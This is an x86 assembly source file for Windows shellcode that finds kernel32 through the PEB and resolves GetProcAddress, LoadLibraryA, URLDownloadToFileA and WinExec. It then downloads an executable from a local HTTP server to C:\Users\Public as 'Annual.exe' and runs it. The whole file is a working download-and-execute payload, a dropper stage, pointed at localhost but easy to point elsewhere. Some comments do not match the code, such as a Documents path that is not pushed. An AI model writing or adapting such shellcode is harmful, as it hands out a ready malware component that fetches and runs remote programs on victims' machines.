; 32-bit shellcode to download a file, store the file, and execute the stored file
; using fasm
format PE console
use32
entry main


main:
    push ebp
    mov ebp, esp
    sub esp, 0x48
    xor esi, esi
    ;ebx will be storing base address of kernel32.dll
    mov ebx, [fs:0x30 + esi] ; address pf PEB
    mov ebx, [ebx+0x0c] ; address of LDR
    mov ebx, [ebx+0x14] ; InMemoryOrderModuleList
    mov ebx, [ebx]
    mov ebx, [ebx]
    mov ebx, [ebx+0x10] ; base address of kernel32.dll
    mov [ebp-0x4], ebx ; saving the address of kernel32.dll in stack

    ;finding the address of GetProcAddress
    mov eax, [ebx+0x3c]
    add eax, ebx ; VA of ImageNtHeader
    mov eax, [eax+0x78]
    add eax, ebx ; VA of Export Director
    mov edx, [eax+0x20] ; RVA of AddressNameTable
    add edx, ebx ; VA of AddressNameTable
    xor ecx, ecx
    ;47 65 74 50 72 6F 63 41
    mov edi, 0x41636f72 ;Acor  GetProcAddress


    .loop:
        inc ecx
        mov esi, [edx+ ecx*0x4] ; esi will have RVA of function's name address
        add esi, ebx ; esi will have VA of function's name address
        cmp [esi+4], edi
        jnz main.loop

     inc ecx
     inc ecx


     mov edx, [eax+0x1c]
     add edx, ebx
     mov edx, [edx+ecx*0x4]
     add edx, ebx  ; here we have the address of GetProcAddress
     mov [ebp-0x8], edx


     ;now we have to call GetProcAddress to get address of LoadLibraryA
     ; 4C 6F 61 64 4C 69 62 72 61 72 79 41  LoadLibraryA

     mov eax, 0x41797261
     push eax
     mov eax, 0x7262694c
     push eax
     mov eax, 0x64616f4c
     push eax
     mov eax, esp ; address of LoadLibraryA

     sub esp, 0x10
     mov ebx, [ebp-0x4]
     mov [esp],ebx
     mov [esp+0x4], eax
     call edx
     add esp, 0x10
     mov [ebp-0xc], eax ; got the address of LoadLibraryA


     ; load urlmon.dll in memory using LoadLibrayA

     xor eax, eax
     ;75 72 6C 6D   6F 6E 2E 64   6C 6C
     mov ax, 0x6c6c
     push eax
     mov eax, 0x642e6e6f
     push eax
     mov eax, 0x6d6c7275
     push eax
     mov eax, esp
     sub esp, 0x0c
     push eax
     mov ecx, [ebp-0xc]
     call ecx
     add esp, 0xc
     mov [ebp-0x10], eax


           ;now we have to call GetProcAddress to get address of UrlDownloadToFileA
     ;55 52 4C 44   6F 77 6E 6C  6F 61 64 54   6F 46 69 6C   65 41   URLDownloadToFileA
     xor eax,eax
     mov ax, 0x4165
     push eax
     mov eax, 0x6c69466f
     push eax
     mov eax, 0x5464616f
     push eax
     mov eax, 0x6c6e776f
     push eax
     mov eax, 0x444c5255
     push eax
     mov eax, esp ; address of URLDownloadToFileA

     sub esp, 0x10
     mov ebx, [ebp-0x10]
     push eax
     push ebx
     mov ecx, [ebp-0x8]
     call ecx

     add esp, 0x10
     mov [ebp-0x14], eax ; got the address of  URLDownloadToFileA

     ;calling URLDownloadToFileA

      xor edx,edx ; this will set up the parameter

     ;68 74 74 70   3A 2F 2F 6C  6F 63 61 6C  68 6F 73 74   3A 38 30 30   30 2F 6D 6C   2E 45 58 45
     ;http://localhost:8000/ml.EXE
     xor eax,eax
     push eax
     mov eax, 0x4558452e
     push eax
     mov eax, 0x6c6d2f30
     push eax
     mov eax, 0x3030383A
     push eax
     mov eax, 0x74736f68
     push eax
     mov eax, 0x6c61636f
     push eax
     mov eax, 0x6c2f2f3A
     push eax
     mov eax, 0x70747468
     push eax
     mov eax, esp ; address of url

   ;43 3A 5C 55   73 65 72 73   5C 50 75 62   6C 69 63 5C   41 6E 6E 75   61 6C 2E 65   78 65
     ;C:\Users\Public\Documents\Annual.exe
     xor ebx, ebx
     push ebx
     mov bx, 0x6578
     push ebx
     mov ebx, 0x652e6c61
     push ebx
     mov ebx, 0x756e6e41
     push ebx
     mov ebx, 0x5c63696c
     push ebx
     mov ebx,0x6275505c
     push ebx
     mov ebx, 0x73726573
     push ebx
     mov ebx,0x555c3A43
     push ebx
     mov ebx,esp ; address of file path
     sub esp, 0x10
     push edx
     push edx
     push ebx
     push eax
     push edx
     mov edx, [ebp-0x14]
     call edx   ; call URLDownloadToFileA

     ; executable is downloaded by now
        ;now we have to call GetProcAddress to get address of Winexec
     ; 57 69 6E 45 78 65 63  Winexec
     xor eax,eax
     push eax
     mov al, 0x63
     push eax
     mov ax, 0x6578
     push eax
     mov eax, 0x456e6957
     push eax
     mov eax, esp ; address of WinExec

     sub esp, 0x10
   ;  and esp, 0xffffff00
     mov ebx, [ebp-0x4]
     push eax
     push ebx
    ; mov [esp],ebx
     mov edx, [ebp-0x8]
     call edx
     add esp, 0x10
     mov [ebp-0xc], eax ; got the address of WinExec



    ;43 3A 5C 55   73 65 72 73   5C 50 75 62   6C 69 63 5C   41 6E 6E 75   61 6C 2E 65   78 65
     ;C:\Users\Public\Annual.exe
     xor ebx, ebx
     push ebx
     mov bx, 0x6578
     push ebx
     mov ebx, 0x652e6c61
     push ebx
     mov ebx, 0x756e6e41
     push ebx
     mov ebx, 0x5c63696c
     push ebx
     mov ebx ,0x6275505c
     push ebx
     mov ebx, 0x73726573
     push ebx
     mov ebx ,0x555c3A43
     push ebx
     mov ebx,esp ; address of file path
     sub esp, 0x10
     and esp, 0xffffff00
     xor eax,eax
     mov al, 10  ; 2st para should be zero
     push eax ;2nd parameter
     push ebx  ; 1nd parameter

     mov ebx, [ebp-0xc]
     call ebx ; call winexec with parameters set






   
